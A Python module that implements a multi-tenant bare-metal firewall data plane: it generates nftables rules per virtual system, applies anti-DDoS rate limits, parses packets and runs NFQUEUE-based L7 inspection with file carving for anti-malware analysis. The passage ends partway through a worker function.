#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
ffn_bmfw.py -- FFN NGFW generalized BARE-METAL data plane (multi-vsys).

The hardware-independent NGFW. Everything else in this tree (the FPGA fabric,
the Corundum NIC, the DPU/accelerators) is an *offload* of this. This module
turns any commodity Linux box with two or more NICs into a working next-gen
firewall using only the kernel:

    L3/L4 stateful firewall + NAT ....... nftables (in-kernel fast path)
    L7 deep inspection .................. NFQUEUE -> userspace inspector
                                          (inline_payload_det + cloud_det)
    Multi-tenancy ....................... VSYS  (per-vsys zones/policy/queue)
    MP/DP separation .................... CPU planes (pinned data-plane workers)

Virtual systems (vsys) each own a disjoint set of interfaces, their own zones,
their own security + NAT rulebase, AND their own NFQUEUE + inspection engine --
so tenants are isolated in both policy and session state on shared hardware.
Each vsys's inspection worker is pinned to a dedicated data-plane CPU core
(ffn_cpu_planes), keeping packet processing off the management/control cores.

    forward hook
        ct established,related -> accept
        iifname @vsys1_ifaces  -> jump vsys1_forward  (rules -> queue 0 -> core 7)
        iifname @vsys2_ifaces  -> jump vsys2_forward  (rules -> queue 1 -> core 8)
        default -> drop

Fully offline-testable: nft generation is pure string output, the packet
parser + per-vsys inspection run against a SyntheticSource, and the real
NFQUEUE / nft / core-pinning paths degrade gracefully off Linux.

CLI:
    ffn_bmfw.py selftest
    ffn_bmfw.py gen-nft [--config cfg.json]
    ffn_bmfw.py check   [--config cfg.json]     # nft -c validate (needs nft)
    ffn_bmfw.py apply   [--config cfg.json]     # load ruleset + sysctls (root)
    ffn_bmfw.py run     [--config cfg.json]     # apply + per-vsys pinned workers
    ffn_bmfw.py planes  [--config cfg.json]     # show the CPU-plane / vsys map
    ffn_bmfw.py flush
"""

import argparse
import json
import logging
import os
import re
import signal
import socket
import struct
import subprocess
import sys
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# Detection stack (built earlier in this tree).
try:
    from ffn_threatdb import ThreatDB
    from inline_payload_det import InlinePayloadDetector, Flow, seed_baseline, \
        ACTION_ALERT, ACTION_DROP, ACTION_RESET
    from cloud_det import CloudDetectionService, LocalSandbox
    _HAVE_DETECT = True
except Exception as _e:  # pragma: no cover
    ThreatDB = InlinePayloadDetector = Flow = None
    CloudDetectionService = LocalSandbox = None
    ACTION_ALERT, ACTION_DROP, ACTION_RESET = 0, 1, 2
    _HAVE_DETECT = False
    _IMPORT_ERR = _e

# Anti-malware + signature DB (built alongside).
try:
    from ffn_sigdb import SignatureDB, seed_baseline as seed_sigs
    from ffn_antimalware import AntiMalware
    _HAVE_AM = True
except Exception:  # pragma: no cover
    SignatureDB = AntiMalware = None
    _HAVE_AM = False

# CPU plane / proc-splitting (built alongside).
try:
    from ffn_cpu_planes import CpuPlanes
    _HAVE_PLANES = True
except Exception:  # pragma: no cover
    CpuPlanes = None
    _HAVE_PLANES = False

logger = logging.getLogger("ffn-bmfw")

NF_DROP, NF_ACCEPT = 0, 1


def _derive_vsys_id(name: str, idx: int) -> int:
    """Derive a numeric vsys tag (contract §2) from a vsys name / position.

    A trailing integer in the name is authoritative (``vsys1`` -> 1) so ids are
    stable and align with the conntrack zone; otherwise fall back to 1-based
    position. Never returns 0 (0 is reserved for shared/untagged).
    """
    m = re.search(r"(\d+)$", name or "")
    if m:
        n = int(m.group(1))
        if n > 0:
            return n
    return idx + 1


# ===========================================================================
# Policy / zone / vsys configuration model
# ===========================================================================
@dataclass
class Zone:
    name: str
    interfaces: List[str] = field(default_factory=list)
    kind: str = "trust"          # trust / untrust / dmz / mgmt


@dataclass
class Rule:
    name: str
    from_zone: str = "any"
    to_zone: str = "any"
    src: str = "any"
    dst: str = "any"
    proto: str = "any"           # tcp / udp / icmp / any
    dports: List[int] = field(default_factory=list)
    action: str = "allow"        # allow / deny / reject
    inspect: bool = False
    log: bool = False
    enabled: bool = True


@dataclass
class NatRule:
    name: str
    to_zone: str
    src: str = "any"
    kind: str = "masquerade"     # masquerade / snat
    to_addr: str = ""


@dataclass
class Vsys:
    """A virtual system: an isolated firewall instance on shared hardware."""
    name: str = "vsys1"
    display_name: str = ""
    zones: List[Zone] = field(default_factory=list)
    rules: List[Rule] = field(default_factory=list)
    nat: List[NatRule] = field(default_factory=list)
    # Numeric packet tag (contract §2): stable int in [1..N], vsys1->1, vsys2->2.
    # 0 = reserved/untagged. Carried end-to-end as the conntrack zone + ct/meta
    # mark so the conntrack + NAT tuple space and the bmfw flow table partition
    # per vsys. May be set explicitly in config; otherwise derived in finalize().
    vsys_id: int = 0
    # assigned by DataplaneConfig.finalize()
    nfqueue_num: int = 0
    dp_core: Optional[int] = None

    def interfaces(self) -> List[str]:
        """All interfaces owned by this vsys (union across its zones)."""
        out = []
        for z in self.zones:
            for i in z.interfaces:
                if i not in out:
                    out.append(i)
        return out

    def zone_wan(self) -> List[str]:
        out = []
        for z in self.zones:
            if z.kind == "untrust":
                out.extend(z.interfaces)
        return out


@dataclass
class DosProtection:
    """Software anti-DDoS / flood protection (ddos_detector + rate_limiter
    engines). Applied in the FORWARD hook as PAN-OS-style zone protection:
    transit NEW connections are rate-limited per protocol, excess is counted
    (named nft counters) and dropped. The management/input path is untouched."""
    enable: bool = True
    syn_rate: int = 2000      # new TCP SYN per second (transit)
    syn_burst: int = 200
    udp_rate: int = 4000      # new UDP flows per second
    udp_burst: int = 400
    icmp_rate: int = 1000     # ICMP/ICMPv6 per second
    icmp_burst: int = 100
    conn_limit: int = 0       # per-source concurrent new conns; 0 = disabled

    @classmethod
    def from_dict(cls, d) -> "DosProtection":
        d = d or {}
        return cls(
            enable=bool(d.get("enable", True)),
            syn_rate=int(d.get("syn_rate", 2000)),
            syn_burst=int(d.get("syn_burst", 200)),
            udp_rate=int(d.get("udp_rate", 4000)),
            udp_burst=int(d.get("udp_burst", 400)),
            icmp_rate=int(d.get("icmp_rate", 1000)),
            icmp_burst=int(d.get("icmp_burst", 100)),
            conn_limit=int(d.get("conn_limit", 0)),
        )


@dataclass
class DataplaneConfig:
    table: str = "ffn_ngfw"
    vsys: List[Vsys] = field(default_factory=list)
    mgmt_ifaces: List[str] = field(default_factory=list)
    mgmt_tcp_ports: List[int] = field(default_factory=lambda: [22, 443])
    mgmt: List[dict] = field(default_factory=list)  # per-iface mgmt profiles
    nfqueue_base: int = 0
    queue_bypass: bool = True
    default_forward: str = "drop"
    # Unknown-object analysis (Crucible). The spec string is passed straight to
    # cloud_det.build_backend: "local" analyses on this box, "relay:<url>"
    # offloads to an analysis node, "relay+local:<url>" offloads and falls back
    # here when the node is unreachable.
    crucible_backend: str = "local"
    # On-box chamber policy. "static" never executes a sample; "jail" and "vm"
    # do. Left at static deliberately -- see the module docstring.
    crucible_policy: str = "static"
    crucible_timeout: int = 30
    crucible_relay_token: str = "/etc/ffn-ngfw/crucible-node.token"
    crucible_relay_pubkey: str = "/etc/ffn-ngfw/crucible-verdict.pub"
    # Drain the submission queue in the parent process. Turning this off means
    # objects are queued and never analysed unless something else drains them.
    crucible_drain: bool = True
    enable_nat: bool = True
    enable_forwarding: bool = True
    data_frac: float = 0.5           # fraction of cores for the data plane
    realtime: bool = False           # SCHED_FIFO on data-plane workers

    def __post_init__(self):
        self.finalize()

    def finalize(self) -> "DataplaneConfig":
        """Assign a distinct NFQUEUE number and numeric vsys_id to each vsys.

        vsys_id (contract §2) is the packet tag used for the conntrack zone and
        ct/meta mark. If a vsys carries no explicit id we derive one: a trailing
        integer in the name (``vsys1`` -> 1) wins so ids stay stable across
        reorders, otherwise we fall back to 1-based position.
        """
        for i, v in enumerate(self.vsys):
            v.nfqueue_num = self.nfqueue_base + i
            if not v.vsys_id:
                v.vsys_id = _derive_vsys_id(v.name, i)
        return self

    def get_vsys(self, name: str) -> Optional[Vsys]:
        return next((v for v in self.vsys if v.name == name), None)

    def vsys_of_iface(self, iface: str) -> Optional[str]:
        for v in self.vsys:
            if iface in v.interfaces():
                return v.name
        return None

    # ---- (de)serialisation -------------------------------------------------
    @classmethod
    def from_dict(cls, d: dict) -> "DataplaneConfig":
        cfg = cls.__new__(cls)
        cfg.table = d.get("table", "ffn_ngfw")
        cfg.mgmt_ifaces = d.get("mgmt_ifaces", [])
        cfg.mgmt_tcp_ports = d.get("mgmt_tcp_ports", [22, 443])
        cfg.mgmt = d.get("mgmt", [])
        cfg.nfqueue_base = d.get("nfqueue_base", 0)
        cfg.queue_bypass = d.get("queue_bypass", True)
        cfg.default_forward = d.get("default_forward", "drop")
        cfg.enable_nat = d.get("enable_nat", True)
        cfg.enable_forwarding = d.get("enable_forwarding", True)
        cfg.data_frac = d.get("data_frac", 0.5)
        cfg.realtime = d.get("realtime", False)
        cfg.dos = DosProtection.from_dict(d.get("dos", {}))

        def _vsys(vd) -> Vsys:
            return Vsys(
                name=vd.get("name", "vsys1"),
                display_name=vd.get("display_name", ""),
                vsys_id=vd.get("vsys_id", 0),
                zones=[Zone(**z) for z in vd.get("zones", [])],
                rules=[Rule(**r) for r in vd.get("rules", [])],
                nat=[NatRule(**n) for n in vd.get("nat", [])])

        if d.get("vsys"):
            cfg.vsys = [_vsys(v) for v in d["vsys"]]
        else:
            # legacy single-vsys config: top-level zones/rules/nat -> vsys1
            cfg.vsys = [Vsys(
                name="vsys1",
                zones=[Zone(**z) for z in d.get("zones", [])],
                rules=[Rule(**r) for r in d.get("rules", [])],
                nat=[NatRule(**n) for n in d.get("nat", [])])]
        cfg.finalize()
        return cfg

    @classmethod
    def load(cls, path: str) -> "DataplaneConfig":
        with open(path) as f:
            return cls.from_dict(json.load(f))


def default_config() -> DataplaneConfig:
    """A sane single-vsys (lan trust -> wan untrust) starter firewall."""
    return DataplaneConfig(vsys=[Vsys(
        name="vsys1", display_name="default",
        zones=[Zone("lan", ["eth1"], kind="trust"),
               Zone("wan", ["eth0"], kind="untrust")],
        rules=[
            Rule("lan-to-wan-web", "lan", "wan", proto="tcp", dports=[80, 443],
                 action="allow", inspect=True, log=True),
            Rule("lan-to-wan-dns", "lan", "wan", proto="udp", dports=[53],
                 action="allow", inspect=True),
            Rule("lan-to-wan-any", "lan", "wan", action="allow", inspect=True),
            Rule("wan-to-lan-deny", "wan", "lan", action="deny", log=True),
        ],
        nat=[NatRule("lan-egress", to_zone="wan", src="any", kind="masquerade")],
    )], mgmt_ifaces=["eth1"])


# ===========================================================================
# nftables ruleset generator (per-vsys chains + dispatch)
# ===========================================================================
class NftGenerator:
    def __init__(self, cfg: DataplaneConfig):
        self.cfg = cfg

    def _proto_match(self, r: Rule) -> str:
        parts = []
        if r.src and r.src != "any":
            parts.append("ip saddr %s" % r.src)
        if r.dst and r.dst != "any":
            parts.append("ip daddr %s" % r.dst)
        if r.proto in ("tcp", "udp"):
            if r.dports:
                parts.append("%s dport { %s }" % (r.proto, ", ".join(str(p) for p in r.dports)))
            else:
                parts.append("meta l4proto %s" % r.proto)
        elif r.proto == "icmp":
            parts.append("meta l4proto { icmp, icmpv6 }")
        return " ".join(parts)

    def _verdict(self, v: Vsys, r: Rule) -> str:
        if r.action == "deny":
            return "drop"
        if r.action == "reject":
            return "reject with icmpx type admin-prohibited"
        if r.inspect:
            byp = " bypass" if self.cfg.queue_bypass else ""
            return "queue num %d%s" % (v.nfqueue_num, byp)
        return "accept"

    def _zone_set(self, v: Vsys, z: Zone) -> str:
        return "%s_zone_%s" % (v.name, z.name)

    def render(self) -> str:
        c = self.cfg
        L = ["#!/usr/sbin/nft -f",
             "# FFN-NGFW bare-metal dataplane -- generated, do not edit by hand",
             "add table inet %s" % c.table,
             "delete table inet %s" % c.table,
             "table inet %s {" % c.table]

        # per-vsys interface sets (per-zone + a union set for dispatch)
        for v in c.vsys:
            for z in v.zones:
                elems = ", ".join('"%s"' % i for i in z.interfaces)
                L.append("    set %s {" % self._zone_set(v, z))
                L.append("        type ifname")
                if elems:
                    L.append("        elements = { %s }" % elems)
                L.append("    }")
            allif = ", ".join('"%s"' % i for i in v.interfaces())
            L.append("    set %s_ifaces {" % v.name)
            L.append("        type ifname")
            if allif:
                L.append("        elements = { %s }" % allif)
            L.append("    }")

        # ---- raw/prerouting: stamp the conntrack zone per vsys -----------
        # Runs at 'raw' priority, i.e. BEFORE conntrack confirms the tuple, so
        # each vsys gets its own conntrack + NAT tuple space (contract §2). This
        # is the correctness fix for the old global-zone overlap: identical
        # 5-tuples in different vsys no longer collide in conntrack/NAT. Keyed on
        # the physical ingress iface (@<vsys>_ifaces) -- unchanged by VRF, since
        # enslaved ifaces still ingress on their physical name (contract §3).
        dos = getattr(self.cfg, "dos", None) or DosProtection()
        if dos.enable:
            for _cn in ("ffn_ddos_syn", "ffn_ddos_udp", "ffn_ddos_icmp", "ffn_ddos_conn"):
                L.append("    counter %s { }" % _cn)
        L.append("    chain raw_prerouting {")
        L.append("        type filter hook prerouting priority raw; policy accept;")
        for v in c.vsys:
            L.append('        iifname @%s_ifaces ct zone set %d comment "vsys %s zone"'
                     % (v.name, v.vsys_id, v.name))
        L.append("    }")

        # ---- input chain: protect the box itself -------------------------
        L.append("    chain input {")
        L.append("        type filter hook input priority filter; policy drop;")
        L.append("        ct state invalid drop")
        L.append("        ct state { established, related } accept")
        L.append('        iif "lo" accept')
        L.append("        meta l4proto { icmp, icmpv6 } accept")
        if c.mgmt_ifaces and c.mgmt_tcp_ports:
            mgmt_if = ", ".join('"%s"' % i for i in c.mgmt_ifaces)
            mgmt_pt = ", ".join(str(p) for p in c.mgmt_tcp_ports)
            L.append('        iifname { %s } tcp dport { %s } accept comment "mgmt"'
                     % (mgmt_if, mgmt_pt))
        # per-interface management-profile rules (only where a profile is enabled)
        for _m in (getattr(c, "mgmt", []) or []):
            _dev = _m.get("iface")
            if not _dev: continue
            _src = ("ip saddr { %s } " % ", ".join(_m["permitted_ip"])) if _m.get("permitted_ip") else ""
            _tcp = _m.get("tcp") or []
            _udp = _m.get("udp") or []
            if _tcp:
                L.append('        iifname "%s" %stcp dport { %s } accept comment "ifmgmt %s"'
                         % (_dev, _src, ", ".join(str(p) for p in _tcp), _dev))
            if _udp:
                L.append('        iifname "%s" %sudp dport { %s } accept comment "ifmgmt %s"'
                         % (_dev, _src, ", ".join(str(p) for p in _udp), _dev))
        L.append('        log prefix "ffn-input-drop " level info drop')
        L.append("    }")

        # ---- forward chain: dispatch to per-vsys chains ------------------
        L.append("    chain forward {")
        L.append("        type filter hook forward priority filter; policy %s;"
                 % c.default_forward)
        L.append("        ct state invalid drop")
        # ---- anti-DDoS / flood protection (ddos_detector + rate_limiter) -----
        # FORWARD hook only => transit protection, PAN-OS zone-protection style.
        # The box's own management is in the INPUT hook, so these rate-limits can
        # never rate-limit or lock out admin access. Excess NEW packets over the
        # per-protocol rate are counted (named counters read back by the API) and
        # dropped; conforming traffic falls through to the normal vsys dispatch.
        if dos.enable:
            L.append('        ct state new meta l4proto tcp tcp flags & (fin|syn|rst|ack) == syn '
                     'limit rate over %d/second burst %d packets counter name "ffn_ddos_syn" '
                     'drop comment "ddos syn-flood"' % (dos.syn_rate, dos.syn_burst))
            L.append('        ct state new meta l4proto udp '
                     'limit rate over %d/second burst %d packets counter name "ffn_ddos_udp" '
                     'drop comment "ddos udp-flood"' % (dos.udp_rate, dos.udp_burst))
            L.append('        ct state new meta l4proto { icmp, ipv6-icmp } '
                     'limit rate over %d/second burst %d packets counter name "ffn_ddos_icmp" '
                     'drop comment "ddos icmp-flood"' % (dos.icmp_rate, dos.icmp_burst))
            if dos.conn_limit > 0:
                L.append('        ct state new meter ffn_ddos_cm { ip saddr ct count over %d } '
                         'counter name "ffn_ddos_conn" drop comment "ddos per-src conn cap"'
                         % dos.conn_limit)
        # NOTE: established/related is intentionally NOT blanket-accepted here --
        # that would fast-path server->client return traffic past L7 inspection,
        # and downloaded content (where most threats live) rides that direction.
        # Each vsys chain decides: inspect established too, or fast-path it.
        for v in c.vsys:
            L.append('        iifname @%s_ifaces jump %s_forward comment "dispatch %s"'
                     % (v.name, v.name, v.name))
        L.append('        log prefix "ffn-fwd-drop " level info')
        L.append("    }")

        # ---- per-vsys forward chains (regular chains, return on no-match) -
        for v in c.vsys:
            L.append("    chain %s_forward {" % v.name)
            # Carry the vsys tag out to userspace/DPDK: ct mark persists the tag
            # on the flow, meta mark stamps this packet (contract §2). NFQUEUE
            # workers + the DPDK fast path read it back from the mark.
            L.append("        ct mark set %d" % v.vsys_id)
            L.append("        meta mark set %d" % v.vsys_id)
            # VRF-aware forwarding (contract §3): the actual route/FIB lookup for
            # this vsys's traffic happens per-l3mdev-VRF in the kernel, NOT here
            # -- nft only classifies/inspects. Do not assume a single global
            # routing table; each member iface is enslaved to its VR's l3mdev
            # device and looks up that VRF's table. The @<vsys>_ifaces dispatch
            # above is unchanged because enslaved ifaces keep their physical name.
            # Return traffic of a permitted session: if this vsys does any L7
            # inspection, send established/related to its queue too (so the
            # server->client content is scanned); otherwise fast-path it.
            inspects = any(r.inspect and r.action == "allow" and r.enabled
                           for r in v.rules)
            if inspects:
                byp = " bypass" if c.queue_bypass else ""
                L.append("        ct state { established, related } queue num %d%s"
                         % (v.nfqueue_num, byp))
            else:
                L.append("        ct state { established, related } accept")
            for r in v.rules:
                if not r.enabled:
                    continue
                m = []
                if r.from_zone != "any":
                    m.append("iifname @%s" % self._zone_set(v, self._zone_by_name(v, r.from_zone)))
                if r.to_zone != "any":
                    m.append("oifname @%s" % self._zone_set(v, self._zone_by_name(v, r.to_zone)))
                pm = self._proto_match(r)
                if pm:
                    m.append(pm)
                logstmt = ('log prefix "ffn-%s-%s " ' % (v.name, r.name[:12])) if r.log else ""
                L.append('        %s %s%s comment "%s/%s"' % (
                    " ".join(m), logstmt, self._verdict(v, r), v.name, r.name))
            L.append("    }")

        # ---- NAT ---------------------------------------------------------
        if c.enable_nat and any(v.nat for v in c.vsys):
            L.append("    chain postrouting {")
            L.append("        type nat hook postrouting priority srcnat; policy accept;")
            for v in c.vsys:
                for n in v.nat:
                    z = self._zone_by_name(v, n.to_zone)
                    cond = "iifname @%s_ifaces oifname @%s" % (v.name, self._zone_set(v, z))
                    if n.src and n.src != "any":
                        cond += " ip saddr %s" % n.src
                    if n.kind == "snat" and n.to_addr:
                        L.append("        %s snat to %s" % (cond, n.to_addr))
                    else:
                        L.append("        %s masquerade" % cond)
            L.append("    }")

        L.append("}")
        return "\n".join(L) + "\n"

    @staticmethod
    def _zone_by_name(v: Vsys, name: str) -> Zone:
        return next((z for z in v.zones if z.name == name), Zone(name, []))


# ===========================================================================
# Packet parsing (L3 as delivered by NFQUEUE)
# ===========================================================================
IPPROTO_ICMP, IPPROTO_TCP, IPPROTO_UDP, IPPROTO_ICMPV6 = 1, 6, 17, 58


@dataclass
class Packet:
    family: int = 4
    proto: int = 0
    saddr: str = ""
    daddr: str = ""
    sport: int = 0
    dport: int = 0
    tcp_flags: int = 0
    payload: bytes = b""
    length: int = 0
    ok: bool = False
    # vsys tag (contract §2), read from the kernel mark on real packets and set
    # by the owning InspectionEngine before flow_key(); 0 = shared/untagged.
    vsys_id: int = 0

    @property
    def is_syn(self) -> bool:
        return self.proto == IPPROTO_TCP and (self.tcp_flags & 0x02) and not (self.tcp_flags & 0x10)

    def flow_key(self) -> str:
        # (vsys_id, proto, sip, sport, dip, dport) -- vsys_id is prepended
        # (contract §2) so per-vsys flow/session tables never collide even for
        # identical 5-tuples. Endpoints are still sorted for direction symmetry.
        a = (self.saddr, self.sport)
        b = (self.daddr, self.dport)
        lo, hi = sorted([a, b])
        return "%d/%d/%s:%d-%s:%d" % (self.vsys_id, self.proto, lo[0], lo[1], hi[0], hi[1])


def parse_ip(data: bytes) -> Packet:
    p = Packet(length=len(data))
    if len(data) < 20:
        return p
    ver = data[0] >> 4
    try:
        if ver == 4:
            ihl = (data[0] & 0x0F) * 4
            if ihl < 20 or len(data) < ihl:
                return p
            p.family = 4
            p.proto = data[9]
            p.saddr = socket.inet_ntop(socket.AF_INET, data[12:16])
            p.daddr = socket.inet_ntop(socket.AF_INET, data[16:20])
            l4 = data[ihl:]
        elif ver == 6:
            if len(data) < 40:
                return p
            p.family = 6
            p.proto = data[6]
            p.saddr = socket.inet_ntop(socket.AF_INET6, data[8:24])
            p.daddr = socket.inet_ntop(socket.AF_INET6, data[24:40])
            l4 = data[40:]
        else:
            return p
    except OSError:
        return p

    if p.proto == IPPROTO_TCP and len(l4) >= 20:
        p.sport, p.dport = struct.unpack("!HH", l4[0:4])
        doff = (l4[12] >> 4) * 4
        p.tcp_flags = l4[13]
        p.payload = l4[doff:] if doff <= len(l4) else b""
        p.ok = True
    elif p.proto == IPPROTO_UDP and len(l4) >= 8:
        p.sport, p.dport = struct.unpack("!HH", l4[0:4])
        p.payload = l4[8:]
        p.ok = True
    elif p.proto in (IPPROTO_ICMP, IPPROTO_ICMPV6):
        p.ok = True
    return p


# ===========================================================================
# Threat / traffic log
# ===========================================================================
class ThreatLog:
    def __init__(self, path: Optional[str] = None):
        self.path = path
        self.events: List[dict] = []
        self.max_mem = 1000

    def emit(self, ev: dict) -> None:
        ev.setdefault("ts", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
        self.events.append(ev)
        if len(self.events) > self.max_mem:
            del self.events[0]
        if self.path:
            try:
                with open(self.path, "a") as f:
                    f.write(json.dumps(ev) + "\n")
            except OSError as e:
                logger.debug("threat log write failed: %s", e)


# ===========================================================================
# L7 inspection engine (per-vsys: isolated flow table + stats)
# ===========================================================================
@dataclass
class _FlowState:
    flow: "Flow"
    c2s_key: Tuple[str, int] = ("", 0)
    carry_c2s: bytes = b""
    carry_s2c: bytes = b""
    blocked: bool = False
    packets: int = 0
    last: float = 0.0


def build_crucible_backend(spec: str = "local", *, policy: str = "static",
                           timeout: int = 30, token_file: str = "",
                           pubkey_file: str = ""):
    """Resolve a backend spec, degrading to the legacy sandbox if need be.

    A misconfigured backend must not stop the firewall from forwarding, so a
    bad spec is logged and downgraded rather than raised: inspection continues
    at lower fidelity instead of the data plane failing to start.
    """
    if CloudDetectionService is None:
        return None
    try:
        from cloud_det import build_backend
    except ImportError:
        return LocalSandbox() if LocalSandbox else None
    try:
        return build_backend(spec, policy=policy, timeout=timeout,
                             token_file=token_file, pubkey_file=pubkey_file)
    except Exception as e:
        logger.error("crucible backend %r rejected (%s); falling back to "
                     "on-box static analysis", spec, e)
        try:
            return build_backend("local", policy="static", timeout=timeout)
        except Exception:
            return LocalSandbox() if LocalSandbox else None


class InspectionEngine:
    CARRY = 512
    FLOW_IDLE = 120

    def __init__(self, inline: "InlinePayloadDetector",
                 cloud: Optional["CloudDetectionService"] = None,
                 threatlog: Optional[ThreatLog] = None,
                 *, carve: bool = True, vsys: str = "vsys1", vsys_id: int = 0,
                 antimalware=None):
        self.inline = inline
        self.cloud = cloud
        self.antimalware = antimalware
        self.log = threatlog or ThreatLog()
        self.carve = carve
        self.vsys = vsys
        # Numeric vsys tag stamped onto every packet before flow_key() so this
        # engine's flow table never collides with another vsys (contract §2).
        # Default: derive from the name (vsys1 -> 1) when not given explicitly.
        self.vsys_id = vsys_id or _derive_vsys_id(vsys, 0)
        self.flows: Dict[str, _FlowState] = {}
        self.stats = {"packets": 0, "accept": 0, "drop": 0, "threats": 0,
                      "carved": 0, "flows": 0}

    def _flow(self, pkt: Packet) -> _FlowState:
        key = pkt.flow_key()
        fs = self.flows.get(key)
        if fs is None:
            proto = "tcp" if pkt.proto == IPPROTO_TCP else \
                    "udp" if pkt.proto == IPPROTO_UDP else "ip"
            fs = _FlowState(flow=Flow(key=key, proto=proto))
            fs.c2s_key = (pkt.saddr, pkt.sport)
            self.flows[key] = fs
            self.stats["flows"] += 1
        return fs

    def _direction(self, pkt: Packet, fs: _FlowState) -> str:
        return "c2s" if (pkt.saddr, pkt.sport) == fs.c2s_key else "s2c"

    def verdict(self, pkt: Packet) -> Tuple[int, Optional[dict]]:
        self.stats["packets"] += 1
        # Stamp the vsys tag before any flow_key() so this engine's flow table
        # is keyed on (vsys_id, 5-tuple) and cannot collide with another vsys.
        pkt.vsys_id = self.vsys_id
        if not pkt.ok:
            self.stats["accept"] += 1
            return NF_ACCEPT, None
        fs = self._flow(pkt)
        fs.packets += 1
        fs.last = time.time()
        if fs.blocked:
            self.stats["drop"] += 1
            return NF_DROP, None
        if not pkt.payload:
            self.stats["accept"] += 1
            return NF_ACCEPT, None

        direction = self._direction(pkt, fs)
        if direction == "c2s":
            window = fs.carry_c2s + pkt.payload
            fs.carry_c2s = window[-self.CARRY:]
        else:
            window = fs.carry_s2c + pkt.payload
            fs.carry_s2c = window[-self.CARRY:]

        det = self.inline.inspect(window, fs.flow)
        if self.carve:
            fs.flow.append(direction, pkt.payload)
            mal = self._assess_carved(fs, pkt)
            # file-based anti-malware conviction blocks the packet + flow
            if mal is not None and mal.blocked:
                fs.blocked = True
                self.stats["drop"] += 1
                self.stats["threats"] += 1
                ev = {"type": "malware", "vsys": self.vsys, "action": mal.verdict,
                      "verdict": mal.verdict, "threat": mal.threat_name,
                      "family": mal.family, "sha256": mal.sha256,
                      "file_type": mal.file_type, "methods": mal.methods,
                      "src": pkt.saddr, "dst": pkt.daddr, "dport": pkt.dport,
                      "summary": mal.summary()}
                self.log.emit(ev)
                return NF_DROP, ev

        if det.matched and det.action in (ACTION_DROP, ACTION_RESET):
            fs.blocked = True
            self.stats["drop"] += 1
            self.stats["threats"] += 1
            ev = {"type": "threat", "vsys": self.vsys, "action": det.action_name,
                  "verdict": det.verdict, "threat": det.threat_name,
                  "proto": pkt.proto, "src": pkt.saddr, "sport": pkt.sport,
                  "dst": pkt.daddr, "dport": pkt.dport,
                  "sigs": [m.name for m in det.matches][:8], "summary": det.summary()}
            self.log.emit(ev)
            return NF_DROP, ev

        if det.matched and det.action == ACTION_ALERT:
            self.stats["threats"] += 1
            ev = {"type": "alert", "vsys": self.vsys, "action": "alert",
                  "threat": det.threat_name, "src": pkt.saddr, "dst": pkt.daddr,
                  "dport": pkt.dport, "summary": det.summary()}
            self.log.emit(ev)
            self.stats["accept"] += 1
            return NF_ACCEPT, ev

        self.stats["accept"] += 1
        return NF_ACCEPT, None

    def _assess_carved(self, fs: _FlowState, pkt: Packet):
        """Run every carved object through anti-malware; return the worst verdict.

        With an anti-malware engine, known/AV/heuristic malware is convicted
        locally (and its hash blocklisted) while unknown executables are handed
        to the cloud sandbox inside assess(). Without one, fall back to a blind
        cloud submit.
        """
        if self.antimalware is None and self.cloud is None:
            return None
        worst = None
        for sha, data, meta in self.inline.carve_files(fs.flow):
            self.stats["carved"] += 1
            meta.update({"vsys": self.vsys, "src": pkt.saddr, "dst": pkt.daddr,
                         "dport": pkt.dport})
            if self.antimalware is not None:
                v = self.antimalware.assess(data, meta)
                v.sha256 = sha
                if worst is None or v.score > worst.score:
                    worst = v
                if not v.blocked:
                    self.log.emit({"type": "sample", "vsys": self.vsys, "sha256": sha,
                                   "verdict": v.verdict, "file_type": v.file_type,
                                   "cloud_submitted": v.cloud_submitted, "dst": pkt.daddr})
            elif self.cloud is not None:
                try:
                    self.cloud.submit(data, meta)
                    self.log.emit({"type": "sample", "vsys": self.vsys, "sha256": sha,
                                   "file_type": meta.get("file_type"), "dst": pkt.daddr,
                                   "action": "submitted"})
                except Exception as e:
                    logger.debug("cloud submit failed: %s", e)
        return worst

    def reap(self, now: Optional[float] = None) -> int:
        now = now or time.time()
        dead = [k for k, fs in self.flows.items() if now - fs.last > self.FLOW_IDLE]
        for k in dead:
            del self.flows[k]
        return len(dead)


# ===========================================================================
# Packet sources
# ===========================================================================
class PacketSource:
    def run(self, handler) -> None:
        raise NotImplementedError

    def stop(self) -> None:
        pass


class SyntheticSource(PacketSource):
    def __init__(self, packets: List[bytes]):
        self.packets = packets
        self.verdicts: List[int] = []

    def run(self, handler) -> None:
        for raw in self.packets:
            self.verdicts.append(handler(raw))


class NFQueueSource(PacketSource):
    def __init__(self, queue_num: int = 0):
        self.queue_num = queue_num
        self._nfq = None

    def run(self, handler) -> None:
        try:
            from netfilterqueue import NetfilterQueue
        except Exception as e:  # pragma: no cover
            raise RuntimeError(
                "netfilterqueue not available (%s); install libnetfilter-queue "
                "+ `pip install NetfilterQueue`" % e)

        def _cb(nfpkt):
            if handler(nfpkt.get_payload()) == NF_DROP:
                nfpkt.drop()
            else:
                nfpkt.accept()

        self._nfq = NetfilterQueue()
        self._nfq.bind(self.queue_num, _cb)
        logger.info("bound NFQUEUE %d; inspecting...", self.queue_num)
        try:
            self._nfq.run()
        finally:
            self._nfq.unbind()

    def stop(self) -> None:  # pragma: no cover
        if self._nfq is not None:
            try:
                self._nfq.unbind()
            except Exception:
                pass


# ===========================================================================
# Per-vsys worker entry (module-level so it survives multiprocessing spawn)
# ===========================================================================
def _run_vsys_worker(vsys_name: str, queue_num: int, threatdb_path: str,
                     threatlog_path: Optional[str],
                     vsys_id: int = 0, backend_spec: str = "local",
                     policy: str = "static", timeout: int = 30,
                     token_file: str = "", pubkey_file: str = "",
                     ) -> None:  # pragma: no cover
    """Data-plane worker: own detection stack + NFQUEUE bind for one vsys.

    Runs in a child process already pinned to a data-plane core by CpuPlanes.
    Each vsys process opens its own ThreatDB handle (SQLite multi-reader) so
    tenants share threat intel but nothing else.
    """
    db = ThreatDB(threatdb_path)
    inline = InlinePayloadDetector(db)
    if not inline.sigs:
        seed_baseline(inline)
    # The worker submits; it does NOT drain. Draining happens once, in the
    # parent, so N vsys processes do not each detonate the same sample.
    cloud = CloudDetectionService(
        db, inline=inline,
        backend=build_crucible_backend(backend_spec, policy=policy,
                                       timeout=timeout,
                                       token_file=token_file,
                                       pubkey_file=pubkey_file))
    am = None
    if _HAVE_AM:
        sigdb = SignatureDB(os.getenv("FFN_SIGDB_PATH", "/var/lib/ffn-ngfw/sigdb.sqlite"))
